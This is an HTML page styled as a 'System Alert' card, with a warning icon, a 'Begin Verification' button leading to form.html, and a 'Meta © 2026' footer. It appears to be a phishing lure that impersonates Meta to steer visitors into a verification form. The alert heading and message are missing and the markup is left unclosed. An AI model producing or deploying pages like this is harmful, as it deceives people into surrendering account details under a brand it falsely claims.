<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>System Alert</title>
    <style>
        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .alert-card { background: #fff; width: 90%; max-width: 400px; padding: 30px; border-radius: 12px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; border-top: 5px solid #e74c3c; }
        .icon { font-size: 50px; color: #e74c3c; margin-bottom: 15px; }
        h1 { font-size: 22px; color: #333; margin-bottom: 10px; }
        p { font-size: 15px; color: #666; line-height: 1.6; margin-bottom: 25px; }
        .btn-action { background-color: #3498db; color: white; border: none; padding: 12px 25px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; transition: 0.3s; width: 100%; }
        .btn-action:hover { background-color: #2980b9; }
        .footer-text { margin-top: 20px; font-size: 12px; color: #999; }
    </style>
</head>
<body>

<div class="alert-card">
    <div class="icon">⚠️</div>

<button class="btn-action" onclick="window.location.href='form.html'">Begin Verification</button>
    
    <div class="footer-text"> 
<div>Meta © 2026</div>
